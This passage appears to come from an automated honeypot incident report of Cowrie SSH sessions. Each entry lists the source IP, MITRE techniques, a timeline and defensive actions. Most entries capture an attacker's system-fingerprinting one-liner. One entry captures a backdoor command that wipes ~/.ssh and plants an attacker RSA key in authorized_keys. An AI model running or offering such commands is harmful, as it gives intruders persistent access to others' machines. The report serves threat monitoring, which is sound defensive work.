| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 00:59:26` | `cowrie.session.connect` |
| `2026-09-29 00:59:26` | `cowrie.client.version` |
| `2026-09-29 00:59:26` | `cowrie.client.kex` |
| `2026-09-29 00:59:27` | `cowrie.login.success` |
| `2026-09-29 00:59:28` | `cowrie.session.params` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.success` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:28` | `cowrie.command.input` |
| `2026-09-29 00:59:29` | `cowrie.log.closed` |
| `2026-09-29 00:59:30` | `cowrie.session.params` |
| `2026-09-29 00:59:30` | `cowrie.command.input` |
| `2026-09-29 00:59:30` | `cowrie.log.closed` |
| `2026-09-29 00:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d6b2d26d6c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:00 |
| **Last Seen** | 2026-09-29 01:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:00:58` | `cowrie.session.connect` |
| `2026-09-29 01:00:58` | `cowrie.client.version` |
| `2026-09-29 01:00:58` | `cowrie.client.kex` |
| `2026-09-29 01:01:00` | `cowrie.login.success` |
| `2026-09-29 01:01:01` | `cowrie.session.params` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.success` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:01` | `cowrie.command.input` |
| `2026-09-29 01:01:02` | `cowrie.log.closed` |
| `2026-09-29 01:01:03` | `cowrie.session.params` |
| `2026-09-29 01:01:03` | `cowrie.command.input` |
| `2026-09-29 01:01:03` | `cowrie.log.closed` |
| `2026-09-29 01:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66a948f2e89

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:02 |
| **Last Seen** | 2026-09-29 01:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:02:26` | `cowrie.session.connect` |
| `2026-09-29 01:02:27` | `cowrie.client.version` |
| `2026-09-29 01:02:27` | `cowrie.client.kex` |
| `2026-09-29 01:02:27` | `cowrie.login.success` |
| `2026-09-29 01:02:29` | `cowrie.session.params` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.success` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.command.input` |
| `2026-09-29 01:02:29` | `cowrie.log.closed` |
| `2026-09-29 01:02:30` | `cowrie.session.params` |
| `2026-09-29 01:02:30` | `cowrie.command.input` |
| `2026-09-29 01:02:31` | `cowrie.log.closed` |
| `2026-09-29 01:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf46c28ed54c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:03 |
| **Last Seen** | 2026-09-29 01:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:03:54` | `cowrie.session.connect` |
| `2026-09-29 01:03:54` | `cowrie.client.version` |
| `2026-09-29 01:03:54` | `cowrie.client.kex` |
| `2026-09-29 01:03:55` | `cowrie.login.success` |
| `2026-09-29 01:03:57` | `cowrie.session.params` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.success` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.command.input` |
| `2026-09-29 01:03:57` | `cowrie.log.closed` |
| `2026-09-29 01:03:58` | `cowrie.session.params` |
| `2026-09-29 01:03:58` | `cowrie.command.input` |
| `2026-09-29 01:03:59` | `cowrie.log.closed` |
| `2026-09-29 01:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aca5c4f6bea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:05 |
| **Last Seen** | 2026-09-29 01:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:05:30` | `cowrie.session.connect` |
| `2026-09-29 01:05:30` | `cowrie.client.version` |
| `2026-09-29 01:05:30` | `cowrie.client.kex` |
| `2026-09-29 01:05:31` | `cowrie.login.success` |
| `2026-09-29 01:05:32` | `cowrie.session.params` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.success` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.command.input` |
| `2026-09-29 01:05:32` | `cowrie.log.closed` |
| `2026-09-29 01:05:33` | `cowrie.session.params` |
| `2026-09-29 01:05:33` | `cowrie.command.input` |
| `2026-09-29 01:05:33` | `cowrie.log.closed` |
| `2026-09-29 01:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-315d23f3f88a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:07 |
| **Last Seen** | 2026-09-29 01:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:07:08` | `cowrie.session.connect` |
| `2026-09-29 01:07:08` | `cowrie.client.version` |
| `2026-09-29 01:07:08` | `cowrie.client.kex` |
| `2026-09-29 01:07:09` | `cowrie.login.success` |
| `2026-09-29 01:07:10` | `cowrie.session.params` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.success` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.command.input` |
| `2026-09-29 01:07:10` | `cowrie.log.closed` |
| `2026-09-29 01:07:11` | `cowrie.session.params` |
| `2026-09-29 01:07:11` | `cowrie.command.input` |
| `2026-09-29 01:07:11` | `cowrie.log.closed` |
| `2026-09-29 01:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93bc63a6b849

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:09 |
| **Last Seen** | 2026-09-29 01:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:09:01` | `cowrie.session.connect` |
| `2026-09-29 01:09:01` | `cowrie.client.version` |
| `2026-09-29 01:09:02` | `cowrie.client.kex` |
| `2026-09-29 01:09:02` | `cowrie.login.success` |
| `2026-09-29 01:09:03` | `cowrie.session.params` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.success` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.command.input` |
| `2026-09-29 01:09:03` | `cowrie.log.closed` |
| `2026-09-29 01:09:04` | `cowrie.session.params` |
| `2026-09-29 01:09:04` | `cowrie.command.input` |
| `2026-09-29 01:09:05` | `cowrie.log.closed` |
| `2026-09-29 01:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d01a149e61b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:10 |
| **Last Seen** | 2026-09-29 01:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:10:59` | `cowrie.session.connect` |
| `2026-09-29 01:10:59` | `cowrie.client.version` |
| `2026-09-29 01:10:59` | `cowrie.client.kex` |
| `2026-09-29 01:11:00` | `cowrie.login.success` |
| `2026-09-29 01:11:01` | `cowrie.session.params` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.success` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.command.input` |
| `2026-09-29 01:11:01` | `cowrie.log.closed` |
| `2026-09-29 01:11:02` | `cowrie.session.params` |
| `2026-09-29 01:11:02` | `cowrie.command.input` |
| `2026-09-29 01:11:02` | `cowrie.log.closed` |
| `2026-09-29 01:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89045d40083

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:12 |
| **Last Seen** | 2026-09-29 01:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:12:30` | `cowrie.session.connect` |
| `2026-09-29 01:12:30` | `cowrie.client.version` |
| `2026-09-29 01:12:31` | `cowrie.client.kex` |
| `2026-09-29 01:12:32` | `cowrie.login.success` |
| `2026-09-29 01:12:33` | `cowrie.session.params` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.success` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:33` | `cowrie.command.input` |
| `2026-09-29 01:12:34` | `cowrie.log.closed` |
| `2026-09-29 01:12:35` | `cowrie.session.params` |
| `2026-09-29 01:12:35` | `cowrie.command.input` |
| `2026-09-29 01:12:36` | `cowrie.log.closed` |
| `2026-09-29 01:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e2d6f237f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:14 |
| **Last Seen** | 2026-09-29 01:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:14:01` | `cowrie.session.connect` |
| `2026-09-29 01:14:01` | `cowrie.client.version` |
| `2026-09-29 01:14:01` | `cowrie.client.kex` |
| `2026-09-29 01:14:02` | `cowrie.login.success` |
| `2026-09-29 01:14:03` | `cowrie.session.params` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.success` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.command.input` |
| `2026-09-29 01:14:03` | `cowrie.log.closed` |
| `2026-09-29 01:14:04` | `cowrie.session.params` |
| `2026-09-29 01:14:04` | `cowrie.command.input` |
| `2026-09-29 01:14:05` | `cowrie.log.closed` |
| `2026-09-29 01:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b49f7b93b26e

| Field | Detail |
|---|---|
| **Source IP** | `45.224.97[.]244` |
| **First Seen** | 2026-09-29 01:14 |
| **Last Seen** | 2026-09-29 01:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:14:07` | `cowrie.session.connect` |
| `2026-09-29 01:14:07` | `cowrie.client.version` |
| `2026-09-29 01:14:07` | `cowrie.client.kex` |
| `2026-09-29 01:14:08` | `cowrie.login.success` |
| `2026-09-29 01:14:09` | `cowrie.session.params` |
| `2026-09-29 01:14:09` | `cowrie.command.input` |
| `2026-09-29 01:14:09` | `cowrie.command.failed` |
| `2026-09-29 01:14:09` | `cowrie.log.closed` |
| `2026-09-29 01:14:10` | `cowrie.session.params` |
| `2026-09-29 01:14:10` | `cowrie.command.input` |
| `2026-09-29 01:14:10` | `cowrie.session.file_download` |
| `2026-09-29 01:14:10` | `cowrie.log.closed` |
| `2026-09-29 01:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.224.97[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.224.97[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04f8b9e7726

| Field | Detail |
|---|---|
| **Source IP** | `45.224.97[.]244` |
| **First Seen** | 2026-09-29 01:14 |
| **Last Seen** | 2026-09-29 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:14:10` | `cowrie.session.connect` |
| `2026-09-29 01:14:10` | `cowrie.client.version` |
| `2026-09-29 01:14:10` | `cowrie.client.kex` |
| `2026-09-29 01:14:11` | `cowrie.login.success` |
| `2026-09-29 01:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.224.97[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.224.97[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb70feb42e9

| Field | Detail |
|---|---|
| **Source IP** | `45.224.97[.]244` |
| **First Seen** | 2026-09-29 01:14 |
| **Last Seen** | 2026-09-29 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
